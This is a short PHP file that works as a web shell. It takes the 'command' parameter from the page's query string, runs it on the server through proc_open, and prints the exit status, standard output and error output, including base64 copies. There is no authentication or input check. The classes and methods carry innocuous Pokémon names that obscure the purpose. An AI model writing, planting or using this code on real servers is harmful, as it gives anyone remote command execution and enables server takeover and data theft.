<?php

function in_tag(string $tag_name, string $string)
{
    return "<{$tag_name}>{$string}</{$tag_name}>";
}

function in_preformatted_text(string $string)
{
    return in_tag("pre", htmlspecialchars($string));
}

function block(string $title, string $content)
{
    return in_tag(
        "div",
        in_tag("h3", htmlspecialchars($title)) .
            in_preformatted_text($content) .
            in_tag("textarea", htmlspecialchars(base64_encode($content))),
    );
}

class Sobble
{
    public array $status;
    public string $stdout_data;
    public string $stderr_data;

    public function __construct(
        array $status,
        string $stdout_data,
        string $stderr_data,
    ) {
        $this->status = $status;
        $this->stdout_data = $stdout_data;
        $this->stderr_data = $stderr_data;
    }

    public function html()
    {
        return block("status", print_r($this->status, true)) .
            block("stdout", $this->stdout_data) .
            block("stderr", $this->stderr_data);
    }
}

class CinderaceException extends Exception
{
}

class Cinderace
{
    public int $read_length = 65536;
    public int $process_poll_delay = 1000;

    public function pyroBall(string $command)
    {
        $descriptor_spec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"],
        ];
        $process = proc_open($command, $descriptor_spec, $pipes);
        if ($process === false) {
            throw new CinderaceException("proc_open failed");
        }
        if (!stream_set_blocking($pipes[1], false)) {
            throw new CinderaceException(
                'set non-blocking mode on $pipes[1] failed',
            );
        }
        if (!stream_set_blocking($pipes[2], false)) {
            throw new CinderaceException(
                'set non-blocking mode on $pipes[2] failed',
            );
        }
        $data = [
            1 => [],
            2 => [],
        ];
        $not_done = [
            1 => true,
            2 => true,
        ];
        while (true) {
            $read = [];
            foreach ($not_done as $key => $value) {
                if ($value) {
                    $read[$key] = $pipes[$key];
                }
            }
            if (count($read) === 0) {
                break;
            }
            $write = null;
            $except = null;
            $result = stream_select($read, $write, $except, null);
            if ($result === false) {
                throw new CinderaceException("stream_select failed");
            }
            foreach ($read as $key => $pipe) {
                $read_result = fread($pipe, $this->read_length);
                if ($read_result === false) {
                    throw new CinderaceException("fread failed");
                }
                if (strlen($read_result) === 0) {
                    fclose($pipes[$key]);
                    $not_done[$key] = false;
                }
                $data[$key][] = $read_result;
            }
        }
        while (true) {
            $status = proc_get_status($process);
            if (!$status["running"]) {
                break;
            }
            usleep($this->process_poll_delay);
        }
        return new Sobble($status, implode($data[1]), implode($data[2]));
    }
}

function main()
{
    if (!array_key_exists("command", $_GET)) {
        return;
    }
    $command = $_GET["command"];
    $cinderace = new Cinderace();
    $sobble = $cinderace->pyroBall($command);
    echo '<link rel="stylesheet" href="https://cdn.simplecss.org/simple.min.css">';
    echo $sobble->html();
}

main();
